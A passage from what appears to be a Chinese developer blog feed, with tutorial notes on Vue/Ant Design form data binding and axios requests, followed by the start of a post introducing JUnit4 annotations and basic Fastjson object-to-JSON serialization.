<h2 id="9-实现监听数据"><a href="#9-实现监听数据" class="headerlink" title="9.实现监听数据"></a>9.实现监听数据</h2><p>在之前的layui的时候，因为我不会对数据进行绑定，所以往往造成自己要写很多的type=hiden，或者必须构造form表单的情况，而使用框架之后可以通过v-model操作简单的实现这个效果，</p>
<p>例如我们可以构造如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a-form-model-item style=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span><br><span class="line">                            &lt;a-input  type=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;logKey&quot;</span> v-model=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span><br><span class="line">                                &lt;a-icon slot=<span class="string">&quot;prefix&quot;</span> type=<span class="string">&quot;lock&quot;</span> style=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span><br><span class="line">                            &lt;/a-input&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    &lt;a-form-model-item <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span><br><span class="line">                      &lt;a-button</span><br><span class="line">                            type=<span class="string">&quot;primary&quot;</span></span><br><span class="line">                            html-type=<span class="string">&quot;submit&quot;</span></span><br><span class="line">                            @click=<span class="string">&quot;selectAddress($event)&quot;</span></span><br><span class="line">                        &gt;</span><br><span class="line">                            添加</span><br><span class="line">                        &lt;/a-button&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在JS代码中：</span></span><br><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现，我并没有写form表单，而我依然可以实现提交数据，是因为使用v-model监听之后，该input输入框的内容被JS实时监控着。</p>
<h2 id="10-监听的妙用"><a href="#10-监听的妙用" class="headerlink" title="10.监听的妙用"></a>10.监听的妙用</h2><p>利用监听，我们可以很轻松的完成对一些看起来很酷炫的特效，比如，如果用户想要提交点击一个按钮，就需要填写几个input框，并且如果框是空的，还可以给出提示等等，这里举出一个例子，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户名判断 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span> <span class="attr">:validate-status</span>=<span class="string">&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">:help</span>=<span class="string">&quot;userNameError() || &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-decorator</span>=<span class="string">&quot;[</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#x27;userName&#x27;,</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;,</span></span></span><br><span class="line"><span class="tag"><span class="string">        ]&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;user&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>顺便一提， 用:引号写入的东西，一般我们是用于条件判断，比如在这里，我们就是利用这个去判断userNameError的状况</p>
<p>在methods当中，我们构造如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">userNameError</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">     <span class="keyword">const</span> &#123; getFieldError, isFieldTouched &#125; = <span class="built_in">this</span>.form;</span><br><span class="line">     <span class="keyword">return</span> isFieldTouched(<span class="string">&#x27;userName&#x27;</span>) &amp;&amp; getFieldError(<span class="string">&#x27;userName&#x27;</span>);</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>

<p>在data当中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      hasErrors,</span><br><span class="line">      form: <span class="built_in">this</span>.$form.createForm(<span class="built_in">this</span>, &#123; <span class="attr">name</span>: <span class="string">&#x27;getWebsocket&#x27;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>官方是如下解释的：</p>
<p>v-decorator 是 Ant Design 的控件验证属性。</p>
<p>经过 <code>getFieldDecorator</code> 或 <code>v-decorator</code> 包装的控件，表单控件会自动添加 <code>value</code>（或 <code>valuePropName</code> 指定的其他属性） <code>onChange</code>（或 <code>trigger</code> 指定的其他属性），数据同步将被 Form 接管，这会导致以下结果：</p>
<p>你不再需要也不应该用 <code>onChange</code> 来做同步，但还是可以继续监听 <code>onChange</code> 等事件。</p>
<p>你不能用控件的 <code>value defaultValue</code> 等属性来设置表单域的值，默认值可以用 <code>getFieldDecorator</code> 或 <code>v-decorator</code> 里的 initialValue。</p>
<p>你不应该用 <code>v-model</code>，可以使用 <code>this.form.setFieldsValue</code> 来动态改变表单值。</p>
<p>也就是说这种方式是吧form由Vue彻底托管了~和之前的不同，会自动判断是否存在值，如果不存在的话，将会调用v-decorator。当然这种方式我是比较模糊的，真要说我比较理解的是另外一个形式</p>
<h2 id="11-v-model的妙用"><a href="#11-v-model的妙用" class="headerlink" title="11.v-model的妙用"></a>11.v-model的妙用</h2><p>在html当中写下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="attr">class</span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a-input</span>  <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;logKey&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;lock&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">class</span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">a-button</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">html-type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">                            @<span class="attr">click</span>=<span class="string">&quot;selectAddress($event)&quot;</span></span></span><br><span class="line"><span class="tag">                        &gt;</span></span><br><span class="line">                            添加</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a-alert</span> <span class="attr">message</span>=<span class="string">&quot;输入key，即可自动溯源&quot;</span> <span class="attr">type</span>=<span class="string">&quot;info&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fontKey&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">a-spin</span> <span class="attr">size</span>=<span class="string">&quot;large&quot;</span> <span class="attr">class</span>=<span class="string">&quot;spinner&quot;</span> <span class="attr">:spinning</span>=<span class="string">&quot;spinning&quot;</span> <span class="attr">:delay</span>=<span class="string">&quot;delayTime&quot;</span> /&gt;</span></span><br><span class="line">                  </span><br></pre></td></tr></table></figure>

<p>注意这里的spinning，我们给她进行托管，如果可以的话，而spinning的期望默认值在data当中构造：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">data()&#123;</span><br><span class="line">    return&#123;</span><br><span class="line">    attackAddressName:&#x27;&#x27;,</span><br><span class="line">    spinning: false,</span><br><span class="line">    delayTime: 500,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>而当我们点击按钮发送数据之后：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>一旦数据成功发送过去，我们就将spinning的值改成true，这样就可以显示了，当获取数据之后，我们就改成false，让他消失即可</p>
<h1 id="axios-part"><a href="#axios-part" class="headerlink" title="axios part"></a>axios part</h1><h2 id="1-aiox发送数据"><a href="#1-aiox发送数据" class="headerlink" title="1.aiox发送数据"></a>1.aiox发送数据</h2><p>axios是一个组件，用于发送数据给后端，相当好用，我们为了降低代码耦合性，应该抓门建立一个axios文件夹，并且设置一个http.js，各种各样的设置我们都在axios当中进行配置即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">import axios from &#x27;axios&#x27;</span><br><span class="line"></span><br><span class="line">axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;</span><br><span class="line">axios.defaults.timeout = 1000000;</span><br><span class="line">axios.defaults.withCredentials = true</span><br></pre></td></tr></table></figure>



<p>例如这样，就是设置了默认的url，设置超时事件，带上cookies等等，而axios的使用也很简单，构造如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&quot;/login&quot;</span>,formData,config).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">res.data == <span class="number">0</span> </span>)</span>&#123;</span><br><span class="line">         alert(<span class="string">&quot;账号或密码错误！&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="built_in">this</span>.$message.success(<span class="string">` login successfully!`</span>);</span><br><span class="line">          router.push(&#123; <span class="attr">path</span>:<span class="string">&quot;/upload&quot;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>axios.get/post</p>
<p>axios.get().theml().catch()</p>
<p>在then和cat当中去写别的东西，上图当中的res.data为API给回来的数据，成功之后router.push就可以让页面进行跳转了</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉自己是边学边写的，学到后面的时候感觉之前的东西还可以做得更好，但是蓝狗了，已经不想动了orz</p>
]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>fastJson</title>
    <url>/2020/11/02/fastJson/</url>
    <content><![CDATA[<h1 id="JUnit4"><a href="#JUnit4" class="headerlink" title="JUnit4"></a>JUnit4</h1><p>在学习fastjson之前，感觉有必要先学习一下Junit4的注解，自从SpringBoot之后注解大量的被使用，</p>
<p>JUnit出现的与因为main方法测试很不方便，摘自百度的部分：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">用main方法测试的话就很不方便，想测试全部方法的话就得把测试代码全部写到里，或者你测一个重写一次。且更重要的是，这样会使测试代码与运行逻辑代码混在一起，不规范。</span><br><span class="line">使用junit就方便多了,这是单元测试，你想测哪个方法就写一个对应的测试方法，然后用junit运行。每个方法之间是独立的，非常灵活。而且测试方法一般不会直接写在原类中，而是单独的测试类，这样测试代码就完全与逻辑代码分开了。	</span><br></pre></td></tr></table></figure>

<p>而在Junit4大量使用了从Java5中开始使用的注解，如下是JUnit4常用的注解：</p>
<h2 id="before，test，after"><a href="#before，test，after" class="headerlink" title="before，test，after"></a>before，test，after</h2><ul>
<li><p>Before：初始化方法，针对每个测试方法，都会执行一遍</p>
</li>
<li><p>Test: 代替main函数，可以让我们灵活的测试某部分代码,注意，测试的时候<strong>不要写一个Test类！！！！</strong>，否则因为会有限选择同包下的test类，导致报错,@Test方法所在类中,<strong>不能存在有参数构造函数,无参构造可以存在</strong></p>
</li>
<li><p>After：在方法结束之后执行，每次都会执行！</p>
</li>
</ul>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.After;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;最先被执行！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我之后才会被执行呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除此之外，Test注解还允许我们添加参数，检测是否抛出某部分异常：</p>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当代码出现异常的时候，则不会抛出异常，相反的，如果这段代码正常抛出，就会抛出异常了。</p>
<h2 id="beforeclass，afterclass"><a href="#beforeclass，afterclass" class="headerlink" title="beforeclass，afterclass"></a>beforeclass，afterclass</h2><ul>
<li>BeforeClass: 在所有类被执行之前执行，只会执行一次，同时必须为static静态方法（因为他们就相当于此）</li>
<li>AfterClass: 在所有类被执行之后执行</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我就相当于构造器！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是test1，我被执行了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我之后才会被执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是test2执行了！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@BeforeClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">beforeClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我在所有的前面被执行，并且我只会执行一次！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@AfterClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">afterClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我在最终所有结束之后才会被执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Ignore"><a href="#Ignore" class="headerlink" title="Ignore"></a>Ignore</h2><ul>
<li>Ignore可以让我们暂时的禁用特定的类，被注解之后的类将不再被执行</li>
</ul>
<p>Ignore经过我测试，只有当他放在测试类前才可以生效。</p>
<p>例子：</p>
<p><img src="image-20201102165311512.png" alt="image-20201102165311512"></p>
<p>而如果我们放在其他类前面：</p>
<p><img src="image-20201102165351821.png" alt="image-20201102165351821"></p>
<p>我们可以发现依然被执行了！</p>
<h2 id="Runwith"><a href="#Runwith" class="headerlink" title="Runwith"></a>Runwith</h2><ul>
<li>Runwith放在测试类之前，用于确定这个类该如何运行，我们也可以不标注，将会使用默认的运行容器</li>
</ul>
<p>可以看这篇文章来理解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;itblog&#x2F;blog&#x2F;1550753?tdsourcetag&#x3D;s_pcqq_aiomsg</span><br></pre></td></tr></table></figure>



<h1 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h1><ul>
<li><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p>
</li>
<li><p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p>
</li>
<li><p>Fastjson 源码地址：<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
</li>
<li><p>Fastjson 中文 Wiki：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p>
</li>
<li><p>也就是说，程序员们用这个程序就是为了传运JSON格式的对象，呃，感觉像序列化一样了？</p>
</li>
</ul>
<h2 id="将JAVA对象转换成json格式"><a href="#将JAVA对象转换成json格式" class="headerlink" title="将JAVA对象转换成json格式"></a>将JAVA对象转换成json格式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Fortest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;JavaToJson&gt; listOfJava = <span class="keyword">new</span> ArrayList&lt;JavaToJson&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">18</span>,<span class="string">&quot;wndmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">20</span>,<span class="string">&quot;Json!&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String list = JSON.toJSONString(listOfJava);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意，上述代码需要另外起一个类，test不允许在有参构造的类中出现</p>
<p>得到输出结果：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;<span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">     <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">     <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>我们还可以格式化自定义输出，控制字段的排序。</p>
<p>我们更新bean并添加如下字段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaToJson</span> </span>&#123;</span><br><span class="line">    <span class="meta">@JSONField(name = &quot;Age&quot;,serialize = false)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;FULL NAME&quot;,ordinal = 2)</span></span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;dd/MM/yyyy&quot;,ordinal = 1)</span></span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br></pre></td></tr></table></figure>

<p>注意在这里我们添加serialize = false，这里是默认我们添加序列化，如果我们设置为false，该字段将不会被显示。</p>
<p>而ordinal，则是用于规定格式化的顺序，需要注意的是，如果你想控制，最好就全部都使用该属性修饰，或者你自己干脆写的时候就从上向下写，不然的话，默认从上向下执行，只会再按照ordinal限定的顺序排列</p>
<p>上述代码输出：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">     	<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"> 	&#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>如果将serialize的false去掉之后，他还是第一个被执行：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="作用对象"><a href="#作用对象" class="headerlink" title="作用对象"></a>作用对象</h2><p>@JSONField 的作用对象:</p>
<ul>
<li><ol>
<li>Field</li>
</ol>
</li>
<li><ol start="2">
<li>Setter 和 Getter 方法</li>
</ol>
</li>
</ul>
<p>需要注意如下两点：</p>
<p><strong>注意：</strong>FastJson 在进行操作时，是根据 getter 和 setter 的方法进行的，并不是依据 Field 进行。</p>
<p><strong>注意：</strong>若属性是私有的，必须有 set 方法。否则无法反序列化。</p>
<p>跟进JSONField查看源码，可以知道我们允许指定很多东西=。=：</p>
